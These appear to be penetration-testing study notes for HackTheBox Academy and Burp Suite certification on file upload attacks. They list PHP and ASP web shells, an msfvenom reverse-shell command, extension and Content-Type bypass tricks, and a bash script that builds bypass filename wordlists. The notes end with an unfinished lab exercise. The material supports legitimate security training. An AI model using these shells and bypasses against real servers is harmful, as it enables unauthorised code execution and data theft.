# File Upload Attacks  

>[Burp Suite Certified Practitioner study notes on file upload bypass](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#file-uploads)  

## Web Shells

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php echo file_get_contents('/etc/hostname'); ?>` | PHP script that executes to get the (hostname) on the back-end server [Arbitrary File Upload](https://academy.hackthebox.com/module/136/section/1260) |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<?php echo shell_exec($_GET[ "cmd" ]); ?>` | Alternative PHP Webshell using shell_exec function. |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| `/usr/share/seclists/Web-Shells` | List of webshells for frameworks such as: CFM,FuzzDB,JSP,Laudanum, Magento, PHP, Vtiger and WordPress. |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** | [Bypass the client-side file type validations](https://academy.hackthebox.com/module/136/section/1280) |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
| **Blacklist Bypass** | [Blacklist Filters](https://academy.hackthebox.com/module/136/section/1288) Use Burp Suite intruder to upload a single file name with list possible extensions. Then use intruder again to perform GET request on all the files upload to identify PHP execution on target. |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** | [Whitelisting Extensions](https://academy.hackthebox.com/module/136/section/1289) |
| `shell.jpg.php` | Double Extension bypass example|
| `shell.php.jpg` | Reverse Double Extension |

### Extra Client Side  

>Client side html code alter to allow file upload validation bypass by removing `validate()`, optional clearing the `onchange` and `accept` values.  

![uploads-client-side-html](/images/uploads-client-side-html.png)  

### Extra Wordlist Script  

>Character Injection - Before/After Extension to generate list of possible filenames to bypass file upload filters on white or black listings.  

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
    done
done
```  

## Content/Type Bypass  

| **Command**   | **Description**   |
| --------------|-------------------|
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of [Web Content-Types](https://academy.hackthebox.com/module/136/section/1290) |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

>Example of the Payload code for the file being uploaded, `<?php echo file_get_contents('/flag.txt'); ?>`, add `GIF8` at top of file body and keep the file name as `shell.php`. The `Content-Type:` is then the injection payload position for Burp Suite Intruder using the above wordlists.  


## Limited Uploads

| **Potential Attack**   | **File Types** |
| --------------|-------------------|
| `XSS` | HTML, JS, SVG, GIF |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS` | ZIP, JPG, PNG |

# Upload Exercise  

>The server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

Client-Side

type-filters-exercise-step1.png


Blacklist

Whitelist
